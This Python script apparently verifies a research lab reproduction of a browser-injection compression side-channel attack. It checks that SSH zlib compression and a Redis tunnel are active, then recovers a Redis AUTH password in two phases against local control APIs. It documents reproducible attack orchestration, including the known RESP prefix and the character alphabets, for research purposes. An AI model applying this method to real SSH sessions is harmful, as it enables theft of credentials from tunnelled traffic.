"""End-to-end verification for the browser-injection scenario (Section 5.2).

Run from the host while the docker-compose stack is up:

    python scripts/verify_browser.py

Checks: HTTP control APIs reachable, SSH up with zlib compression, Redis
tunnel active, browser connected via WebSocket, packets observed during
Redis AUTH, and a two-phase recovery of "hunter2".
"""

from __future__ import annotations

import json
import sys
import time
import urllib.error
import urllib.request

ATTACKER_BASE = "http://127.0.0.1:9000"
CLIENT_BASE = "http://127.0.0.1:8000"
RESP_PREFIX = "*3\r\n$4\r\nAUTH\r\n$7\r\ndefault\r\n$"


def http(method: str, url: str, body: bytes | None = None,
         content_type: str | None = None, timeout: float = 1800.0) -> dict:
    headers = {}
    if content_type:
        headers["Content-Type"] = content_type
    req = urllib.request.Request(url, method=method, data=body, headers=headers)
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        raw = resp.read()
    if not raw:
        return {}
    return json.loads(raw)


def wait_for(url: str, label: str, timeout: float = 60.0) -> None:
    deadline = time.time() + timeout
    last_err: Exception | None = None
    while time.time() < deadline:
        try:
            http("GET", url)
            print(f"  [ok] {label} reachable")
            return
        except (urllib.error.URLError, ConnectionResetError, OSError) as exc:
            last_err = exc
            time.sleep(1.0)
    raise SystemExit(f"!! {label} never came up: {last_err}")


def step(title: str) -> None:
    print()
    print("=" * 72)
    print(title)
    print("=" * 72)


def fail(msg: str) -> "NoReturn":  # type: ignore[name-defined]
    print(f"FAIL: {msg}")
    sys.exit(1)


def browser_attack(known_prefix: str, alphabet: str, max_length: int) -> dict:
    body = json.dumps({
        "scenario": "browser",
        "config": {
            "known_prefix": known_prefix,
            "alphabet": alphabet,
            "max_length": max_length,
        },
    }).encode("utf-8")
    return http("POST", f"{ATTACKER_BASE}/run_attack", body=body,
                content_type="application/json")


def main() -> int:
    step("1. Wait for HTTP control APIs")
    wait_for(f"{ATTACKER_BASE}/status", "attacker")
    wait_for(f"{CLIENT_BASE}/status", "client")

    step("2. Inspect client SSH state")
    cs = http("GET", f"{CLIENT_BASE}/status")
    print(json.dumps(cs, indent=2))

    if not cs.get("ssh_connected"):
        fail("client reports ssh_connected=false")
    send_alg = cs.get("ssh_send_compression")
    if send_alg not in ("zlib", "zlib@openssh.com"):
        fail(f"send compression is {send_alg!r}, expected zlib*")
    print(f"  [ok] compression: {send_alg}")

    pf = cs.get("port_forwards", {})
    if not pf.get("redis_tunnel", {}).get("active"):
        fail("Redis tunnel port forward not active")
    print(f"  [ok] Redis tunnel active")

    if not cs.get("browser_connected"):
        fail("client reports browser_connected=false")
    print("  [ok] browser launched")

    step("3. Inspect attacker state")
    asn = http("GET", f"{ATTACKER_BASE}/status")
    print(json.dumps(asn, indent=2))

    if not asn.get("browser_connected"):
        fail("attacker reports browser_connected=false (WebSocket not up)")
    print("  [ok] browser connected to attacker via WebSocket")

    step("4. Trigger Redis AUTH and verify packet capture")
    http("POST", f"{ATTACKER_BASE}/clear_log")
    http("POST", f"{ATTACKER_BASE}/trigger_secret")
    time.sleep(0.4)
    log = http("GET", f"{ATTACKER_BASE}/packet_log")
    if not log["records"]:
        fail("no TCP segments observed during Redis AUTH")
    print(f"  [ok] {log['count']} segments captured during AUTH")

    step("5. Browser-injection attack: recover hunter2")
    http("POST", f"{CLIENT_BASE}/set_secret",
         body=json.dumps({"value": "hunter2"}).encode("utf-8"),
         content_type="application/json")
    time.sleep(2.0)

    t0 = time.time()

    print("  Phase 1: recovering password length...")
    r1 = browser_attack(RESP_PREFIX, "0123456789", 4)
    pw_len = r1["recovered"]
    print(f"    length = {pw_len} ({r1['elapsed_seconds']:.1f}s)")

    print("  Phase 2: recovering password...")
    r2 = browser_attack(RESP_PREFIX + pw_len + "\r\n",
                       "abcdefghijklmnopqrstuvwxyz0123456789",
                       int(pw_len) + 4)
    password = r2["recovered"]
    elapsed = time.time() - t0
    print(f"    password = {password!r} ({r2['elapsed_seconds']:.1f}s)")

    print()
    print(f"  Expected:  hunter2")
    print(f"  Recovered: {password}")
    print(f"  Total:     {elapsed:.1f}s")
    status = "PASS" if password == "hunter2" else "FAIL"
    print(f"  Status:    {status}")

    return 0 if status == "PASS" else 1


if __name__ == "__main__":
    sys.exit(main())
